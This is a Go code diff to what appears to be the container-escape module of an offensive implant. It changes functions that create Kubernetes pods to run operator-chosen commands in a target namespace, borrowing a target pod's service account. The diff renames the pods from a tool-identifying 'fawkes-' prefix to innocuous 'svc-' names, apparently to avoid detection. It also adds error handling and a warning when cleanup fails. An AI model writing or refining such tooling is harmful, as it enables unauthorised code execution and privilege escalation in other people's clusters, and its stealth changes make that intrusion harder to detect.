@@ -34,7 +34,7 @@ func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
 		return "Required: -command '<command to run in pod>'", "error"
 	}
 
-	podName := fmt.Sprintf("fawkes-%d", time.Now().Unix()%100000)
+	podName := fmt.Sprintf("svc-%d", time.Now().Unix()%100000)
 
 	podSpec := map[string]interface{}{
 		"apiVersion": "v1",
@@ -70,7 +70,10 @@ func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
 		},
 	}
 
-	podJSON, _ := json.Marshal(podSpec)
+	podJSON, err := json.Marshal(podSpec)
+	if err != nil {
+		return fmt.Sprintf("Error: failed to marshal pod spec: %v", err), "error"
+	}
 
 	var sb strings.Builder
 	sb.WriteString(fmt.Sprintf("[*] Creating pod '%s' in namespace '%s'\n", podName, ns))
@@ -100,7 +103,9 @@ func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
 				Phase string `json:"phase"`
 			} `json:"status"`
 		}
-		_ = json.Unmarshal(statusData, &podStatus)
+		if err := json.Unmarshal(statusData, &podStatus); err != nil {
+			sb.WriteString(fmt.Sprintf("[!] Failed to parse pod status: %v\n", err))
+		}
 		structs.ZeroBytes(statusData)
 
 		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
@@ -121,8 +126,12 @@ func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
 		sb.WriteString("[!] Failed to retrieve pod logs\n")
 	}
 
-	_, _, _ = kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
-	sb.WriteString("\n[+] Pod deleted\n")
+	_, delCode, delErr := kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
+	if delErr != nil || (delCode != 200 && delCode != 404) {
+		sb.WriteString(fmt.Sprintf("\n[!] Warning: pod cleanup failed (code=%d): %v — pod %s may still be running\n", delCode, delErr, podName))
+	} else {
+		sb.WriteString("\n[+] Pod deleted\n")
+	}
 
 	return sb.String(), "success"
 }
@@ -164,7 +173,9 @@ func escapeK8sExec(args containerEscapeArgs) (string, string) {
 			ServiceAccountName string `json:"serviceAccountName"`
 		} `json:"spec"`
 	}
-	_ = json.Unmarshal(podData, &targetSpec)
+	if err := json.Unmarshal(podData, &targetSpec); err != nil {
+		return fmt.Sprintf("Failed to parse pod spec for '%s': %v", targetPod, err), "error"
+	}
 	structs.ZeroBytes(podData)
 
 	image := "alpine"
@@ -180,7 +191,7 @@ func escapeK8sExec(args containerEscapeArgs) (string, string) {
 	sb.WriteString(fmt.Sprintf("[*] Using image: %s\n", image))
 	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", execCmd))
 
-	podName := fmt.Sprintf("fawkes-exec-%d", time.Now().Unix()%100000)
+	podName := fmt.Sprintf("svc-exec-%d", time.Now().Unix()%100000)
 	podSpec := map[string]interface{}{
 		"apiVersion": "v1",
 		"kind":       "Pod",
@@ -201,7 +212,10 @@ func escapeK8sExec(args containerEscapeArgs) (string, string) {
 		},
 	}
 
-	podJSON, _ := json.Marshal(podSpec)
+	podJSON, err := json.Marshal(podSpec)
+	if err != nil {
+		return fmt.Sprintf("Error: failed to marshal pod spec: %v", err), "error"
+	}
 	data, code, postErr := kc.k8sPost(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns), podJSON)
 	if postErr != nil || code < 200 || code >= 300 {
 		return fmt.Sprintf("Failed to create exec pod (HTTP %d): %v\n%s", code, postErr, string(data)), "error"
@@ -217,7 +231,9 @@ func escapeK8sExec(args containerEscapeArgs) (string, string) {
 				Phase string `json:"phase"`
 			} `json:"status"`
 		}
-		_ = json.Unmarshal(statusData, &podStatus)
+		if err := json.Unmarshal(statusData, &podStatus); err != nil {
+			sb.WriteString(fmt.Sprintf("[!] Failed to parse pod status: %v\n", err))
+		}
 		structs.ZeroBytes(statusData)
 		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
 			sb.WriteString(fmt.Sprintf("[*] Pod phase: %s\n", podStatus.Status.Phase))
@@ -232,8 +248,12 @@ func escapeK8sExec(args containerEscapeArgs) (string, string) {
 		structs.ZeroBytes(logData)
 	}
 
-	_, _, _ = kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
-	sb.WriteString("\n[+] Exec pod deleted\n")
+	_, delCode, delErr := kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
+	if delErr != nil || (delCode != 200 && delCode != 404) {
+		sb.WriteString(fmt.Sprintf("\n[!] Warning: exec pod cleanup failed (code=%d): %v — pod %s may still be running\n", delCode, delErr, podName))
+	} else {
+		sb.WriteString("\n[+] Exec pod deleted\n")
+	}
 
 	return sb.String(), "success"
 }
